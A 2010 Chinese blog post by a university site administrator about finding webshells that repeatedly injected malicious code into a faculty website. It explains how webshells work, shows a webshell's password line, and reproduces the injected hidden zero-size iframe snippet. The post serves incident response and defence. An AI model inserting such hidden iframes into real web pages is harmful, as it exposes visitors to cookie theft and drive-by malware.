title: "窥视网站木马安装过程——webshell"
id: 73
date: 2010-04-25 08:40:48
tags: 
- 网络安全
categories: 
- 电脑网络
---

这几天总是发现教科院新网站总是被挂马，第一次听到有人说网站被360浏览器报告有木马，很烦躁，这怎么可能呢……然后想，这个360浏览器也太差了吧， 怎么能够随便报告木马。然后没多久又报告大一信息员在添加文章时候发现居然打开不开文章添加页面了。我一看果然中木马了，于是马上把所有文档下载下来，清 除木马，然后又修补了网站的几个漏洞，查了下sql日志文件，也没有发现什么蛛丝马迹，一点头绪都没有，怎么会这样被修改网页啊。也没有发现可疑文件呀。 就这样一直忙到下午三点半还没有吃饭。

又过了几天，居然又全部中毒……而且情况基本和上次完全一样，所有目录下的index.php | html | htm文件全部被追加了一段xss代码，还有一个config文件被改，于是又修复了几个漏洞，但是还是不知道这到底怎么回事，新 网站本身的安全性能很高啊，怎么会这样被修改。然后仔细查看了所有文件，还是没有问题。

这个周末，又发现木马了！实在痛苦，不知是哪里的黑客这么烦人、卑鄙。绝对鄙视这种家伙。又是一次长时间的查看修复。一切恢复以后了，还是和前两次一样。忽然我想也许在老网站的更目录下有 webshell也说不定，新网就放在老网站中的一个文件夹中，如果老网站上有webshell，那新网站无论如何安全也同样只有被宰割的命运了。果然不到一分钟就发现一个怪异的文件z.asp，一看第一行是：

```
UserPass=&quot;1&quot;     '密码串
```

这种文件通常就是 webshell了。在此介绍一下什么是webshell吧：webshell对于一个攻击者而言是一个完全占领一个服务器的脚本，webshell和网 站本身所运行的语言是一致的，比如教科院的网站可以运行php文件，也可以运行asp文件，那么这个z.asp就是一个恶意的文件，webshell的一 个特性是可以通过它来查看服务器上的所有文件并且可以随意的操作（包括下载修改删除），这个webshell本身和网站运行权限是一致的。

传 webshell到服务器上通常有几个途径，直接上传和通过网站漏洞（比如sql注入漏洞，利用网站程序本身写入webshell）。接下来当然是直接删 除webshell啦，还发现一个规律，webshell通常比较大，而一般的一个正常的脚本文件会在30kb以下，所以那些大的可运行文件通常非常可 疑。

然后，居然在网站上发现了4个webshell，三个asp，一个php的。下面让大家看看webshell怎么工作的吧：
首先是运行，这个webshell在根目录下，在根目录上我们更容易发现而已，希望在其他目录上不要有才好啊，有机会得写一个webshell检测的工具才 行。对于z.asp这个shell运行很简单，直接输入http://edu.nenu.edu.cn/z.asp就可以啦，当然这个页已经被我删除 了，下面是一个很酷的登陆界面

密码 就在上面了，UserPass="1" ，输入1就可以就去了

![](http://eblog.nenu.edu.cn/UploadFiles/2010-4/425953304.jpg)

这就是主页面了，和本地的文件浏览没有什么差别，而且使用也没有什么技术难度，在这里很容易看到了传媒学院 的网站（和教课的网站放在一个目录下，所有的目录都用椭圆盖住了），然后看了下传媒的网站，确实也被注入了脚本，在文件夹旁边就有几个选项 （copy,del,move,Down)，多危险啊，这里还发现了学校主页的备份，webshell下的网站是如此脆弱啊。下面是这个挂木马的工具：

![](http://eblog.nenu.edu.cn/UploadFiles/2010-4/425608279.jpg)

呵呵，原来木马就是这样插入的啊，还发现这个有扫描木马的功能呢，也许有用。最后在本地机 上实验了一下，果然非常成功地在本身挂上了木马，而且和网站上情况一模一样——所有文件后面追加木马：

```
<iframe src="http://127.0.0.1/m.htm" width=0  height=0></iframe>
```

这个文件用户在浏览器上是看不到的，高度宽度都等于0，却暗中加载了一些任意的恶意代码。比如获取正在浏览的用户cookie，甚至是控制浏览此网页的用户
